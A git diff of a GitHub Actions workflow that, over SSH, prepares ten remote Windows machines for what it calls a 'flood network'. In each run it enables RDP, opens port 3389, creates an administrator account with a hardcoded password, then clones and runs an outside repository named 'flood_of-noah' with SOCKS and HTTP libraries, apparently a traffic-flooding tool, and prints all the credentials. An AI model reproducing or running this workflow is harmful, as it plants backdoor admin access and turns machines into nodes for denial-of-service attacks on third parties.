@@ -1,4 +1,4 @@
-name: Deploy Flood Network
+name: 🚀 Deploy Flood Network to 10 Machines
 
 on:
   workflow_dispatch:
@@ -24,41 +24,109 @@ jobs:
     
     steps:
       - name: Get IP Address
+        id: get-ip
         run: |
           IFS=',' read -ra IPS <<< "$MACHINE_IPS"
           INDEX=$(( ${{ matrix.machine }} - 1 ))
           IP="${IPS[$INDEX]}"
           echo "IP=$IP" >> $GITHUB_ENV
-          echo "Deploying to Machine ${{ matrix.machine }} at $IP"
-          
-      - name: Setup SSH
+          echo "Machine ${{ matrix.machine }} -> $IP"
+
+      - name: Setup SSH Key
         run: |
           mkdir -p ~/.ssh
           echo "${{ github.event.inputs.ssh_key }}" > ~/.ssh/id_rsa
           chmod 600 ~/.ssh/id_rsa
-          
-      - name: Execute Commands
+          echo -e "Host *\n  StrictHostKeyChecking no" > ~/.ssh/config
+
+      - name: Deploy Configuration
         run: |
-          ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no ${{ github.event.inputs.ssh_user }}@$IP << 'EOF'
-            # Enable RDP
-            powershell -Command "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0"
-            
-            # Create user
-            powershell -Command "\$pass = ConvertTo-SecureString 'Ricardo159447!${{ matrix.machine }}' -AsPlainText -Force; New-LocalUser -Name 'FLOOD${{ matrix.machine }}' -Password \$pass; Add-LocalGroupMember -Group 'Administrators' -Member 'FLOOD${{ matrix.machine }}'"
-            
-            # Setup flood
-            cd ~
-            rm -rf flood_of-noah
-            git clone https://github.com/benbenido025-lab/flood_of-noah
-            cd flood_of-noah
-            rm -rf node_modules package-lock.json
-            npm install express axios socks --save
-            node index.js &
+          # Create a temporary script with all commands
+          cat > commands.sh << 'EOF'
+          #!/bin/bash
+          
+          # Enable RDP
+          powershell -Command "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0"
+          
+          # Allow RDP in firewall
+          powershell -Command "netsh advfirewall firewall add rule name='RDP' dir=in action=allow protocol=TCP localport=3389"
+          
+          # Create user
+          powershell -Command "\$pass = ConvertTo-SecureString 'Ricardo159447!${{ matrix.machine }}' -AsPlainText -Force; New-LocalUser -Name 'FLOOD${{ matrix.machine }}' -Password \$pass; Add-LocalGroupMember -Group 'Administrators' -Member 'FLOOD${{ matrix.machine }}'; Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'FLOOD${{ matrix.machine }}'"
+          
+          # Setup flood_of-noah
+          cd /tmp
+          rm -rf flood_of-noah
+          git clone https://github.com/benbenido025-lab/flood_of-noah
+          cd flood_of-noah
+          rm -rf node_modules package-lock.json
+          npm install express axios socks --save
+          node index.js &
+          
+          echo "Deployment complete for Machine ${{ matrix.machine }}"
+          echo "RDP User: FLOOD${{ matrix.machine }}"
+          echo "RDP Pass: Ricardo159447!${{ matrix.machine }}"
           EOF
           
-      - name: Show Info
+          # Copy script to target machine
+          scp -i ~/.ssh/id_rsa commands.sh ${{ github.event.inputs.ssh_user }}@$IP:/tmp/commands.sh
+          
+          # Execute the script on target machine
+          ssh -i ~/.ssh/id_rsa -T ${{ github.event.inputs.ssh_user }}@$IP "bash /tmp/commands.sh"
+
+      - name: Verify Deployment
         run: |
-          echo "Machine ${{ matrix.machine }} deployed"
+          ssh -i ~/.ssh/id_rsa -T ${{ github.event.inputs.ssh_user }}@$IP << 'EOF'
+            echo "=== Verification for Machine ${{ matrix.machine }} ==="
+            echo "IP: $IP"
+            echo ""
+            echo "Checking user FLOOD${{ matrix.machine }}:"
+            powershell -Command "Get-LocalUser -Name 'FLOOD${{ matrix.machine }}'"
+            echo ""
+            echo "Checking RDP status:"
+            powershell -Command "Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections'"
+            echo ""
+            echo "Checking Node processes:"
+            powershell -Command "Get-Process node"
+            echo "=== Verification Complete ==="
+          EOF
+
+      - name: Show Connection Info
+        run: |
+          echo ""
+          echo "========================================"
+          echo "MACHINE ${{ matrix.machine }} DEPLOYED"
+          echo "========================================"
           echo "IP: $IP"
-          echo "User: FLOOD${{ matrix.machine }}"
-          echo "Pass: Ricardo159447!${{ matrix.machine }}"
+          echo "RDP Username: FLOOD${{ matrix.machine }}"
+          echo "RDP Password: Ricardo159447!${{ matrix.machine }}"
+          echo "RDP Port: 3389"
+          echo ""
+          echo "✅ RDP Enabled"
+          echo "✅ User Created"
+          echo "✅ Flood_of-noah Running"
+          echo "========================================"
+          echo ""
+
+  summary:
+    needs: deploy
+    runs-on: ubuntu-latest
+    steps:
+      - name: Final Summary
+        run: |
+          echo ""
+          echo "╔═══════════════════════════════════════════════════╗"
+          echo "║     10 MACHINE FLOOD NETWORK - COMPLETE         ║"
+          echo "╚═══════════════════════════════════════════════════╝"
+          echo ""
+          echo "All 10 machines have been configured successfully!"
+          echo ""
+          
+          IFS=',' read -ra IPS <<< "$MACHINE_IPS"
+          for i in "${!IPS[@]}"; do
+            NUM=$((i + 1))
+            echo "Machine $NUM: ${IPS[$i]}"
+            echo "  User: FLOOD$NUM"
+            echo "  Pass: Ricardo159447!$NUM"
+            echo ""
+          done
